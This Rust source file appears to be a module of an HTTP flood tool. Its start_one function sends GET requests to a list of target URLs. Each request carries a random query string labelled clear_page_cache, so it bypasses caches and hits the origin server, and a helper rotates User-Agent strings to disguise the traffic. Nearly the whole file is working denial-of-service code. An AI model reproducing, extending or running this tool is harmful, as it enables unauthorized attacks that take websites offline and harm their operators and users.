use crate::appcfg;
use crate::target;

#[derive(Debug)]
pub enum AttackError {
    Other(String),
    Request(reqwest::Error),
}

pub async fn start_one(targets: Vec<target::Target>) -> Result<(), AttackError> {
    use reqwest::{header, Method};

    let ref mut headers = header::HeaderMap::new();
    headers.insert(
        "Accept",
        header::HeaderValue::from_static(
            "text/html, application/xhtml+xml, application/xml;q=0.9, */*;q=0.8",
        ),
    );
    let ref req_client = reqwest::ClientBuilder::new()
        //.user_agent(any_other_user_agent())
        .default_headers(headers.clone())
        .build()
        .map_err(AttackError::Request)?;
    for t in targets.iter() {
        match t.method {
            Method::GET => match t.url.as_ref().map(url::Url::as_str) {
                Some(u) => {
                    let mut u = u.to_string();
                    u.push_str(&format!("?{}", clear_page_cache()));
                    req_client.get(u).send().await;
                    // crate::log(u);
                }
                None => {
                    continue;
                }
            },
            _ => {
                // unimplemented!();
            }
        }
    }

    Ok(())
}

fn any_other_user_agent(cfg: &appcfg::AppCfg) -> String {
    use rand::Rng;
    let mut rng = rand::thread_rng();
    let s_agent = rng.gen_range(0, cfg.agents.len());

    if let Some(agent) = cfg.agents.get(s_agent) {
        return agent.to_string();
    } else {
        any_other_user_agent(cfg)
    }
}

fn clear_page_cache() -> String {
    use rand::Rng;
    let mut rng = rand::thread_rng();

    format!("{}", rng.gen::<u64>())
}
